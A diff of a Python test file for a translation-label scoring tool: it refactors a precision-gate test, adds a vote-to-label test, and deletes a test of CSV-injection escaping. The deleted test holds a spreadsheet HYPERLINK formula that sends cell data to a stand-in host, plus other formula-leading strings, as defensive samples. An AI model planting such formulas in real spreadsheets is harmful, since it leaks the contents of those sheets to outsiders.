@@ -105,23 +105,32 @@ def test_the_pure_half_holds_its_own_invariants():
     renderings.demo()
 
 
-def test_the_gate_scores_the_served_verdict_not_the_answer(tmp_path):
+def test_the_gate_scores_the_served_verdict_not_the_answer():
     """Precision is of what a READER would see: pairs served as one statement,
     quotes served as a translation. A model that is right about everything it
     did NOT serve must not pass on that."""
-    from tools.gold_renderings import score
+    from tools.gold_renderings import gate
 
-    sheet = tmp_path / "labels.csv"
-    header = "id,kind,question,speaker,story,a_language,a_outlet,a_quote,b_language,b_outlet,b_quote,model_p,label\n"
-    served_same_right = "".join(f"s{i},same,q,X,s,English,o,a,Kannada,o,b,0.95,y\n" for i in range(19))
-    served_same_wrong = "w,same,q,X,s,English,o,a,Kannada,o,b,0.95,n\n"
-    not_served = "".join(f"n{i},same,q,X,s,English,o,a,Kannada,o,b,0.10,n\n" for i in range(30))
-    translated_right = "".join(f"t{i},spoken,q,X,s,Kannada,o,a,,,,0.05,n\n" for i in range(20))
-    sheet.write_text(header + served_same_right + served_same_wrong + not_served + translated_right)
-    assert score(sheet) == 0  # same: 19/20 = 0.95 served right; spoken: 20/20
+    right = [{"kind": "same", "model_p": 0.95, "label": "y"}] * 19
+    wrong = [{"kind": "same", "model_p": 0.95, "label": "n"}]
+    unserved = [{"kind": "same", "model_p": 0.10, "label": "n"}] * 30
+    translated = [{"kind": "spoken", "model_p": 0.05, "label": "n"}] * 20
+    assert gate(right + wrong + unserved + translated) is True  # 19/20 = 0.95 served right
+    assert gate(right + wrong + wrong + unserved + translated) is False  # 19/21, however right the unserved
 
-    sheet.write_text(header + served_same_right + served_same_wrong + served_same_wrong + not_served + translated_right)
-    assert score(sheet) == 1  # 19/21 < 0.95, however right the unserved 30 were
+
+def test_a_label_is_what_every_definite_answer_agrees_on():
+    """Unsure and "I can't read this" are not votes, and a split is not a label —
+    the same rule tools/gold_candidates keeps disputes out of gold with."""
+    from tools.gold_renderings import labels_from
+
+    yes = {"selected": ["t"], "unsure": False, "skipped": False}
+    no = {"selected": [], "unsure": False, "skipped": False}
+    unsure = {"selected": [], "unsure": True, "skipped": False}
+    assert labels_from([yes, yes, unsure]) == "y"
+    assert labels_from([no]) == "n"
+    assert labels_from([yes, no]) is None
+    assert labels_from([unsure]) is None
 
 
 @pytest.mark.asyncio(loop_scope="session")
@@ -164,13 +173,3 @@ async def test_each_event_commits_on_its_own(monkeypatch):
     monkeypatch.setattr(renderings, "judge_event", fake_judge)
     await renderings.sweep()
     assert len(sessions) == 3 and len({id(x) for x in sessions}) == 3, "every event gets its own session"
-
-
-def test_scraped_text_cannot_become_a_spreadsheet_formula():
-    from tools.gold_renderings import cell
-
-    assert cell('=HYPERLINK("http://x.example/?d="&A1,"read")') == '\'=HYPERLINK("http://x.example/?d="&A1,"read")'
-    for hostile in ("+1+1", "-2+3", "@SUM(A1)", "\tlead", "\rlead"):
-        assert cell(hostile).startswith("'"), hostile
-    assert cell("You must go to school") == "You must go to school"
-    assert cell(0.5) == 0.5
